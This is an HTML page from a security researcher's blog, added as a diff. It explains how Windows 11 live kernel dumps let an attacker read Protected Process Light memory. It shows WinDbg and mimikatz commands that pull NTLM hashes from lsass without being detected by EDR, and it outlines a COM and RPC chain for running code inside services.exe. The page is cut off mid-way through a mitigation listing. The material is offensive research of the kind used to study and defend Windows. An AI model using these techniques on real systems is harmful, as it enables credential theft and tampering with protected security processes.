@@ -1,0 +1,538 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title> Injecting code into PPL processes without vulnerable drivers on Windows 11 - Slowerzs&#39; blog </title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="referrer" content="no-referrer">
+    <meta name="description" content="" />
+    <meta property="og:site_name" content="Slowerzs&#39; blog" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://blog.slowerzs.net/posts/pplsystem/" />
+    <meta property="og:title" content="Injecting code into PPL processes without vulnerable drivers on Windows 11" />
+    <meta property="og:image" content="https://blog.slowerzs.net/images/small-favicon.png" />
+    <meta property="og:description" content="" />
+
+    <meta name="twitter:card" content=" summary_large_image" />
+    
+    <meta name="twitter:title" content="Injecting code into PPL processes without vulnerable drivers on Windows 11" />
+    <meta name="twitter:description" content="" />
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@slowerzs">
+    <meta name="twitter:image" content="https://blog.slowerzs.net/images/small-favicon.png" />
+
+    <link rel="canonical" href="https://blog.slowerzs.net/posts/pplsystem/">
+
+    <link rel="stylesheet" href="https://blog.slowerzs.net/css/bootstrap.min.css" />
+
+    <link rel="stylesheet" href="https://blog.slowerzs.net/css/custom.css" />
+    <link rel="stylesheet" href="https://blog.slowerzs.net/css/syntax.css" />
+
+    
+
+    <link rel="shortcut icon"
+        href="https://blog.slowerzs.net/images/favicon.png?">
+
+</head>
+
+<body>
+    <script>
+
+        window.addEventListener('load', function () {
+            hljs.configure({
+                ignoreUnescapedHTML: true
+            })
+            hljs.highlightAll();
+        }, true);
+
+        let darkTheme = localStorage.getItem("darkTheme")
+        if (darkTheme === null) {
+            if (window.matchMedia("(prefers-color-scheme: dark)").matches) {
+                document.documentElement.setAttribute('data-theme', 'dark');
+                localStorage.setItem("darkTheme", true);
+                document.getElementById("light-css").setAttribute('disabled', 'true')
+                document.getElementById("dark-css").removeAttribute('disabled')
+            } else {
+                document.documentElement.setAttribute('data-theme', 'light');
+                localStorage.setItem("darkTheme", false);
+                document.getElementById("dark-css").setAttribute('disabled', 'true')
+                document.getElementById("light-css").removeAttribute('disabled')
+            }
+        } else if (darkTheme === "true") {
+            document.documentElement.setAttribute('data-theme', 'dark');
+            document.getElementById("light-css").setAttribute('disabled', 'true')
+            document.getElementById("dark-css").removeAttribute('disabled')
+        } else {
+            document.documentElement.setAttribute('data-theme', 'light');
+            document.getElementById("dark-css").setAttribute('disabled', 'true')
+            document.getElementById("light-css").removeAttribute('disabled')
+        }
+
+        function switchTheme() {
+            let darkTheme = localStorage.getItem("darkTheme");
+            if (darkTheme === null) {
+                darkTheme = window.matchMedia("(prefers-color-scheme: dark)").matches.toString()
+            }
+
+            if (darkTheme === "true") {
+                document.documentElement.setAttribute('data-theme', 'light');
+                localStorage.setItem("darkTheme", false);
+                document.getElementById("dark-css").setAttribute('disabled', 'true')
+                document.getElementById("light-css").removeAttribute('disabled')
+            } else {
+                document.documentElement.setAttribute('data-theme', 'dark');
+                localStorage.setItem("darkTheme", true);
+                document.getElementById("light-css").setAttribute('disabled', 'true')
+                document.getElementById("dark-css").removeAttribute('disabled')
+            }
+
+        }
+    </script>
+    
+    <div class="mt-xl header">
+    <div class="container">
+        <div>
+            <div class="row justify-content-center">
+                <div class="row">
+                    <a href="https://blog.slowerzs.net/">
+                        <h1 class="name">Slowerzs&#39; blog</h1>
+                    </a>
+                    <img id="switcher" onclick="switchTheme()" src="https://blog.slowerzs.net/images/theme-dark.svg" height="32px" width="32px"
+                        style="position: absolute; left: 93%; transform: translateX(-93%);" />
+                </div>
+            </div>
+
+            <div class="row justify-content-center">
+                <ul class="nav nav-primary">
+                    
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://blog.slowerzs.net/">
+                            
+                            Home
+                        </a>
+                    </li>
+                    
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://github.com/Slowerzs">
+                            
+                            Github
+                        </a>
+                    </li>
+                    
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://twitter.com/slowerzs">
+                            
+                            Twitter
+                        </a>
+                    </li>
+                    
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://blog.slowerzs.net/archive">
+                            
+                            Archive
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <div class="content">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-sm-12 col-lg-8">
+                    <h1 class="mx-0 mx-md-4">Injecting code into PPL processes without vulnerable drivers on Windows 11</h1>
+                    <div class="markdown">
+                        
+    <p>While reading <a href="https://googleprojectzero.blogspot.com/2018/11/injecting-code-into-windows-protected.html">this</a> article from James Forshaw on leveraging COM to inject code into a process, I discovered a syscall that I didn&rsquo;t known about: <code>NtSystemDebugControl</code>.</p>
+<p>Being unfamiliar with this syscall, I decided to look for more information. I found <a href="https://github.com/gtworek/PSBits/blob/master/Misc/New-KernelDump.ps1">this</a> PowerShell snippet, which worked well to dump kernel-mode memory. Looking for more, I found that the <code>Flags</code> argument was an enum that contained a <code>IncludeUserSpaceMemoryPages</code>. As the name suggests, if this flag is specified, the memory dump will include user-mode pages that are not swapped out.</p>
+<p>From what I could gather, this flag used to be available to userland, but was later restricted to drivers only in an earlier Windows version, up until Windows 11. I decided to give it a try anyways, and, to my surprise, it actually worked ! The memory dump did contain user-mode memory pages. Digging deeper, I found that this only worked on Windows 11.</p>
+<p>Immediately, I wanted to see if this could be abused to bypass the protection of <em>Protected Process Light (PPL)</em></p>
+<p>If you are unfamiliar with <em>Protected Process Light</em>, I would recommend reading <a href="https://itm4n.github.io/lsass-runasppl/#what-are-ppl-processes">this article</a>. In short, some processes can be run as <em>Protected Process Light</em>, which tries to protect them even from a malicious privileged user. To do this, only Windows-signed libraries and executable files can (theoretically) be loaded within the <em>PPL</em>, and standard processes cannot get a <code>HANDLE</code> to the process with full access to the <em>PPL</em> process, to prevent code injection.</p>
+<h2 id="windows-11-vs-windows-10">Windows 11 vs Windows 10</h2>
+<p>The difference can be found by comparing the syscall in a Windows 11 and Windows 10 installation: when the <code>IncludeUserSpaceMemoryPages</code> flag is specified, the calls ends up in <code>DbgkCaptureLiveKernelDump</code></p>
+<p>Here is the relevant code of this function on Windows 10 :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">IsFullLiveDumpDisabled</span> <span class="o">=</span> <span class="nf">DbgkpWerIsFullLiveDumpDisabled</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">IsFullLiveDumpDisabled</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#34;DBGK: Full Live Kernel Dumps are disabled. Failing request.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">STATUS_CONTENT_BLOCKED</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((((</span><span class="n">PreviousMode</span> <span class="o">==</span> <span class="sc">&#39;\x01&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">KdPitchDebugger</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">KdLocalDebugEnabled</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">STATUS_DEBUGGER_INACTIVE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>However, on Windows 11 (23H2), the code is the following :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">IsFullLiveDumpDisabled</span> <span class="o">=</span> <span class="nf">DbgkpWerIsFullLiveDumpDisabled</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">IsFullLiveDumpDisabled</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#34;DBGK: Full Live Kernel Dumps are disabled. Failing request.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">STATUS_CONTENT_BLOCKED</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line hl"><span class="cl"><span class="n">IsFeatureEnabled</span> <span class="o">=</span> <span class="nf">Feature_LivedumpProcessFiltering__private_IsEnabled</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((((</span><span class="n">IsFeatureEnabled</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">PreviousMode</span> <span class="o">==</span> <span class="sc">&#39;\x01&#39;</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="n">param_1</span><span class="p">[</span><span class="mh">0xe</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">   <span class="p">((</span><span class="n">KdPitchDebugger</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">KdLocalDebugEnabled</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">))))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">STATUS_DEBUGGER_INACTIVE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>A new check for a feature named <code>LivedumpProcessFiltering</code> is present in the Windows 11 version, which permits the capture of user-mode pages in the dump.
+Previously, this fonction was restricted to drivers, or system with debugging enabled.</p>
+<p>A check for the <code>SeDebugPrivilege</code> is still required to call this syscall from userland.</p>
+<p>This ability to create kernel dump with user-mode pages is actually used by the Task Manager, and has been published in a Microsoft <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/task-manager-live-dump">article</a>.</p>
+<h2 id="dumping-lsass">Dumping LSASS</h2>
+<p>The first offensive use case for this feature is to use this dump to read memory pages inside <code>lsass.exe</code> (regardless of whether <code>RunAsPPL</code> is configured for <code>lsass.exe</code>), to retrieve credentials for active Logon Sessions.</p>
+<p>This is already implemented in Mimikatz&rsquo;s plugin for WinDbg:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">0: kd&gt; .load C:\\path\\to\\mimilib.dll
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  .#####.   mimikatz 2.2.0 (x64) built on Aug 10 2021 02:01:09
+</span></span><span class="line"><span class="cl"> .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - Windows build 22631
+</span></span><span class="line"><span class="cl"> ## / \ ##  /* * *
+</span></span><span class="line"><span class="cl"> ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+</span></span><span class="line"><span class="cl"> &#39;## v ##&#39;   https://blog.gentilkiwi.com/mimikatz             (oe.eo)
+</span></span><span class="line"><span class="cl">  &#39;#####&#39;                                  WinDBG extension ! * * */
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">===================================
+</span></span><span class="line"><span class="cl">#         * Kernel mode *         #
+</span></span><span class="line"><span class="cl">===================================
+</span></span><span class="line"><span class="cl"># Search for LSASS process
+</span></span><span class="line"><span class="cl">0: kd&gt; !process 0 0 lsass.exe
+</span></span><span class="line"><span class="cl"># Then switch to its context
+</span></span><span class="line"><span class="cl">0: kd&gt; .process /r /p &lt;EPROCESS address&gt;
+</span></span><span class="line"><span class="cl"># And finally :
+</span></span><span class="line"><span class="cl">0: kd&gt; !mimikatz
+</span></span><span class="line"><span class="cl">===================================
+</span></span><span class="line"><span class="cl">#          * User mode *          #
+</span></span><span class="line"><span class="cl">===================================
+</span></span><span class="line"><span class="cl">0:000&gt; !mimikatz
+</span></span><span class="line"><span class="cl">===================================
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0: kd&gt; !process 0 0 lsass.exe
+</span></span><span class="line"><span class="cl">PROCESS ffffa1834530d080
+</span></span><span class="line"><span class="cl">    SessionId: 0  Cid: 0574    Peb: b9abf5a000  ParentCid: 0508
+</span></span><span class="line"><span class="cl">    DirBase: 018a8000  ObjectTable: ffff910463f91680  HandleCount: 1267.
+</span></span><span class="line"><span class="cl">    Image: lsass.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Page 3eb169 not present in the dump file. Type &#34;.hh dbgerr004&#34; for details
+</span></span><span class="line"><span class="cl">0: kd&gt; .process /r /p  ffffa1834530d080
+</span></span><span class="line"><span class="cl">Implicit process is now ffffa183`4530d080
+</span></span><span class="line"><span class="cl">Loading User Symbols
+</span></span><span class="line"><span class="cl">................................................................
+</span></span><span class="line"><span class="cl">.....................
+</span></span><span class="line"><span class="cl">0: kd&gt; !mimikatz
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SekurLSA
+</span></span><span class="line"><span class="cl">========
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[...]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	msv : 
+</span></span><span class="line"><span class="cl">	 [00000003] Primary
+</span></span><span class="line"><span class="cl">	 * Username : Administrator
+</span></span><span class="line"><span class="cl">	 * Domain   : DOMAIN
+</span></span><span class="line"><span class="cl">	 * NTLM     : &lt;NT_HASH&gt;
+</span></span></code></pre></div><p>This method is unlikely to raise any EDR detection, since this does not rely on traditionnal code injection/cross-process memory reads: no handle to <code>lsass.exe</code> is required.</p>
+<p>Credentials will only be retrieved on systems with <em>Credential Guard</em> disabled.</p>
+<h1 id="code-injection">Code injection</h1>
+<p>While the ability to dump <code>lsass.exe</code> is useful on its own, I wanted to see if I could leverage this to gain code execution within a <em>PPL</em> process, ideally running at the highest level, <em>Win-TCB</em>.</p>
+<p>There are several offensive use cases to getting actual code execution within a <em>PPL</em>. The first one, as demonstrated by <a href="https://github.com/realoriginal/angryorchard"><code>angryorchard</code></a>, is the ability to get an arbitrary kernel pointer decrement, if you can inject code into the <code>csrss.exe</code> process, which runs at the <em>PPL-WinTCB</em> level.
+While the ability to decrement the <code>PreviousMode</code> value will <a href="https://twitter.com/GabrielLandau/status/1597001955909697536">reportedly</a> be mitigated in a future Windows version, this primitive probably can be leveraged in some other ways, crossing the admin-to-kernel boundary.</p>
+<p>On systems with <em>Credentials Guard</em> enabled, being able to inject code inside <code>lsass.exe</code> can help <a href="https://research.ifcr.dk/pass-the-challenge-defeating-windows-defender-credential-guard-31a892eee22">retrieve NetNTLMv1 hashes</a>, and can also be used to <a href="https://github.com/outflanknl/C2-Tool-Collection/tree/main/BOF/WdToggle">reactivate</a> <em>Wdigest</em>, which will capture credentials in cleartext, and not within <a href="https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/tlfs/vsm">VTL1</a>.</p>
+<p>This can also be used to tamper with EDR usermode processes, which usually run at the <em>PPL-ELAM</em> level.</p>
+<p>For the rest of this blogpost, the focus will be on injecting code inside the <code>services.exe</code> process, which runs as <em>PPL</em>, at the <em>WinTCB</em> level, which is the highest level.</p>
+<h2 id="existing-techniques-and-history">Existing techniques and history</h2>
+<p>As far as I know, there has been 3 public tools that resulted in code execution within a <em>PPL</em> process. These are <a href="https://github.com/itm4n/PPLdump">PPLdump</a>, <a href="https://github.com/itm4n/PPLmedic">PPLmedic</a>, and <a href="https://github.com/gabriellandau/PPLFault">PPLFault</a>.</p>
+<p>The main flaw abused by these tools, first reported in <a href="http://publications.alex-ionescu.com/Recon/Recon%202018%20-%20Unknown%20Known%20DLLs%20and%20other%20code%20integrity%20trust%20violations.pdf">this</a> presentation, is how the signature verification works when loading a DLL inside a <em>PPL</em> process.
+When a DLL is loaded from disk, <code>NtCreateSection</code> is first called with <code>SEC_IMAGE</code>, and the resulting section object is then mapped via <code>NtMapViewOfSection</code>. However, the signature verification only occurs when <code>NtCreateSection</code> is called, and <em>not</em> when the section is mapped within the process.</p>
+<p>This was mainly abused through the <code>KnownDll</code> mechanism, which is a cache containing section objects of commonly used DLL. When such a DLL is loaded within a process, the section object is first opened via <code>NtOpenSection</code>, and then mapped by calling <code>NtMapViewOfSection</code>. This means that the signature verification process is bypassed. And although a non <em>PLL</em> cannot directly add a section object of a DLL in <code>KnownDLLs</code>, it is possible to trick <code>csrss.exe</code> to add it for us - <code>csrss.exe</code> runs at <em>PPL-WinTCB</em>.</p>
+<p>To mitigate these, Microsoft implemented two things. First, <code>ntdll!LdrpKnownDllDirectoryHandle</code>, which holds a handle to <code>KnownDll</code> inside a normal process, is now unintialized by default inside PPL processes, and has been moved inside the <code>.mrdata</code> section. This section is read-only most of the time, and when a variable within this section needs to be changed, <code>LdrProtectMrdata</code> is called to toggle the memory permissions of the <code>.mrdata</code> section, make the change, and then toggled back.</p>
+<p>Looking at a memory dump of a PPL process, we can see the following, which confirms the mitigations are present:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">0:000&gt; !address ntdll!LdrpKnownDllDirectoryHandle
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Usage:                  Image
+</span></span><span class="line"><span class="cl">Base Address:           00007ffc`ebddb000
+</span></span><span class="line"><span class="cl">End Address:            00007ffc`ebe66000
+</span></span><span class="line"><span class="cl">Region Size:            00000000`0008b000 ( 556.000 kB)
+</span></span><span class="line"><span class="cl">State:                  00001000          MEM_COMMIT
+</span></span><span class="line hl"><span class="cl">Protect:                00000002          PAGE_READONLY
+</span></span><span class="line"><span class="cl">Type:                   01000000          MEM_IMAGE
+</span></span><span class="line"><span class="cl">Allocation Base:        00007ffc`ebc50000
+</span></span><span class="line"><span class="cl">Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY
+</span></span><span class="line"><span class="cl">Image Path:             ntdll.dll
+</span></span><span class="line"><span class="cl">Module Name:            ntdll
+</span></span><span class="line"><span class="cl">Loaded Image Name:      C:\Windows\SYSTEM32\ntdll.dll
+</span></span><span class="line"><span class="cl">Mapped Image Name:      
+</span></span><span class="line"><span class="cl">More info:              lmv m ntdll
+</span></span><span class="line"><span class="cl">More info:              !lmi ntdll
+</span></span><span class="line"><span class="cl">More info:              ln 0x7ffcebdea2b0
+</span></span><span class="line"><span class="cl">More info:              !dh 0x7ffcebc50000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0:000&gt; dp ntdll!LdrpKnownDllDirectoryHandle
+</span></span><span class="line hl"><span class="cl">00007ffc`ebdea2b0  00000000`00000000 00000000`00000000
+</span></span></code></pre></div><p>Aside from these tools, James Forshaw published an <a href="https://googleprojectzero.blogspot.com/2018/11/injecting-code-into-windows-protected.html">article</a> which demonstrated how to use COM remoting to overwrite <code>ntdll!LdrpKnownDllDirectoryHandle</code> with a valid handle to then load into a <em>Protect Process</em> an unsigned DLL, using the mechanism described above (at the time, <code>ntdll!LdrpKnownDllDirectoryHandle</code> was not placed inside the <code>.mrdata</code> section).</p>
+<p>This technique was later described in details in MDSec&rsquo;s <a href="https://www.mdsec.co.uk/2022/04/process-injection-via-component-object-model-com-irundowndocallback/">blog</a>, and implemented in a <a href="https://github.com/mdsecactivebreach/com_inject/tree/main">proof of concept</a> to inject code into a remote process.</p>
+<p>The short version is, if you can read the target process&rsquo;s COM secret and context, as well as the <em>IPID</em> of the <code>IRundown</code> interface within the target process, it is possible to remotely invoke the <code>IRundown::DoCallback</code> method within the <em>PPL</em> process. This method takes a <code>XAptCallback</code> structure as an argument, which holds a function pointer to invoke in the remote process, as well as single argument to pass to the function. The function pointer is validated by <em>Control Flow Guard (CFG)</em>, so it can&rsquo;t be any pointer.</p>
+<h2 id="getting-arbitrary-function-call">Getting arbitrary function call</h2>
+<p>Since we can read the memory of the usermode pages of a <em>PPL</em> process such as <code>services.exe</code> through the livedump generated by <code>NtSystemDebugControl</code>, the exploitation of <code>IRundown::DoCallback</code> is possible.</p>
+<p>However, whereas the COM process secret and context of <code>services.exe</code> was always present within the dump, the <em>IPID</em> was rarely present - most likely due to being paged out (I haven&rsquo;t investigated the reason why).
+To avoid this issue, it is possible to read the memory of the <code>RPCSS</code> service, which maintains a list of all <em>IPID</em> on a machine, since it is responsible for dispatching remote <em>COM</em> calls to the appropriate process where the actual object lives. <code>RPCSS</code> does not run as <em>PPL</em>, so it is possible to directly use <code>ReadProcessMemory</code> - it could also be parsed from the memory dump.</p>
+<p>With this, it&rsquo;s possible to call any CFG-valid target, with a single argument within <code>services.exe</code>.</p>
+<h2 id="getting-an-arbitrary-memory-write">Getting an arbitrary memory write</h2>
+<p>In his writeup, James Forshaw uses this primitive to call <code>SetProcessDefaultLayout</code> and <code>GetProcessDefaultLayout</code>, to overwrite <code>LdrpKnownDllDirectoryHandle</code> with a valid handle value.</p>
+<p>Since it&rsquo;s not possible anymore to directly overwrite <code>ntdll!LdrpKnownDllDirectoryHandle</code>, I&rsquo;ll try to get the ability to call any function, without limitation for the arguments. And for that, an arbitrary write will make it much easier.</p>
+<p>The combination of <code>GetProcessDefaultLayout</code> and <code>SetProcessDefaultLayout</code> only writes a value in the form of <code>0x0?0?0?0?</code>, which isn&rsquo;t so easy to manipulate, so I searched for other APIs.</p>
+<p>Instead of searching for a function that would let me precisely control the value written, I looked for arbitrary increment.</p>
+<p>Looking for a &ldquo;AddRef&rdquo; function was fruitful. I settled on <code>combase!CStdStubBuffer_AddRef</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">0:017&gt; uf combase!CStdStubBuffer_AddRef
+</span></span><span class="line"><span class="cl">combase!CStdStubBuffer_AddRef [onecore\com\combase\ndr\ndrole\stub.cxx @ 878]:
+</span></span><span class="line"><span class="cl">  878 00007ff9`31d4e580 b801000000      mov     eax,1
+</span></span><span class="line"><span class="cl">  880 00007ff9`31d4e585 f00fc14108      lock xadd dword ptr [rcx+8],eax
+</span></span><span class="line"><span class="cl">  880 00007ff9`31d4e58a ffc0            inc     eax
+</span></span><span class="line"><span class="cl">  881 00007ff9`31d4e58c c3              ret
+</span></span></code></pre></div><p>This functions takes a single argument in the <code>RCX</code> register, and increments the dword pointed by <code>RCX+8</code>, atomically.</p>
+<p>This function is also a valid CFG target, so this works perfectly. Now, to get an arbitrary write using this arbitrary increment, it&rsquo;s simply a matter of incrementing a memory region, byte by byte, to get the desired memory buffer.</p>
+<p>In the next steps, we will need to craft multiple arbitrary buffers, so, where should we write these buffers ? I opted to use the end of the <code>.data</code> section of various DLL that are already loaded in the <em>PPL</em> process. In memory, the sections of a PE file are page size-aligned, with zero-padding between sections. Since the pages of the <code>.data</code> section are allocate as RW, this gives us zero-initialized memory that is unused and writeable - overwriting this data won&rsquo;t risk crashing the process.</p>
+<h2 id="rpc-to-the-rescue-">RPC to the rescue !</h2>
+<p>Now, we have two primitives: arbitrary write, and a one argument function call. The goal is to transform this into the ability to call any function without limitation on the arguments.</p>
+<p>To do so, I reused an idea from <a href="https://iamelli0t.github.io/2021/04/10/RPC-Bypass-CFG.html#windows-rpc-introduction-and-exploitation">this browser exploitation technique</a>.</p>
+<p>The idea is relatively simple, with the arbitrary write, it&rsquo;s possible to setup a <em>NDR</em> message, which is the representation of RPC messages. Then, it is possible to call <a href="https://learn.microsoft.com/en-us/windows/win32/api/rpcndr/nf-rpcndr-ndrservercall2"><code>rpcrt4!NdrServerCall2</code></a>, with a single argument being a pointer to a <code>RPC_MESSAGE</code> structure, containing the NDR. This function is responsible for unmarshalling the <em>NDR</em>, which includes informations on a function to invoke, as well as the number of arguments to pass to the function.</p>
+<p>By carefully cratfing the structure, it is possible to call an arbitrary function, with as many arguments as we want.</p>
+<p>From there, injecting code into <code>services.exe</code> seems to be simply a matter of allocating RWX memory, and creating a thread.</p>
+<h2 id="mitigations">Mitigations</h2>
+<p>Unfortunately, this won&rsquo;t work for <code>services.exe</code>. Here&rsquo;s the list of mitigations active on the process:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">0: kd&gt; dx @$curprocess.KernelObject.MitigationFlagsValues
+</span></span><span class="line"><span class="cl">@$curprocess.KernelObject.MitigationFlagsValues                 [Type: &lt;unnamed-tag&gt;]
+</span></span><span class="line"><span class="cl">    [+0x000 ( 0: 0)] ControlFlowGuardEnabled : 0x1 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 ( 1: 1)] ControlFlowGuardExportSuppressionEnabled : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 ( 2: 2)] ControlFlowGuardStrict : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 ( 3: 3)] DisallowStrippedImages : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 ( 4: 4)] ForceRelocateImages : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 ( 5: 5)] HighEntropyASLREnabled : 0x1 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 ( 6: 6)] StackRandomizationDisabled : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 ( 7: 7)] ExtensionPointDisable : 0x1 [Type: unsigned long]
+</span></span><span class="line hl"><span class="cl">    [+0x000 ( 8: 8)] DisableDynamicCode : 0x1 [Type: unsigned long]
+</span></span><span class="line hl"><span class="cl">    [+0x000 ( 9: 9)] DisableDynamicCodeAllowOptOut : 0x0 [Type: unsigned long]
+</span></span><span class="line hl"><span class="cl">    [+0x000 (10:10)] DisableDynamicCodeAllowRemoteDowngrade : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (11:11)] AuditDisableDynamicCode : 0x1 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (12:12)] DisallowWin32kSystemCalls : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (13:13)] AuditDisallowWin32kSystemCalls : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (14:14)] EnableFilteredWin32kAPIs : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (15:15)] AuditFilteredWin32kAPIs : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (16:16)] DisableNonSystemFonts : 0x1 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (17:17)] AuditNonSystemFontLoading : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (18:18)] PreferSystem32Images : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (19:19)] ProhibitRemoteImageMap : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (20:20)] AuditProhibitRemoteImageMap : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (21:21)] ProhibitLowILImageMap : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (22:22)] AuditProhibitLowILImageMap : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (23:23)] SignatureMitigationOptIn : 0x1 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (24:24)] AuditBlockNonMicrosoftBinaries : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (25:25)] AuditBlockNonMicrosoftBinariesAllowStore : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (26:26)] LoaderIntegrityContinuityEnabled : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (27:27)] AuditLoaderIntegrityContinuity : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (28:28)] EnableModuleTamperingProtection : 0x0 [Type: unsigned long]
+</span></span><span class="line"><span class="cl">    [+0x000 (29:29)] EnableModuleTamperingProtectionNoInherit : 0x0 [Type: unsigned long]
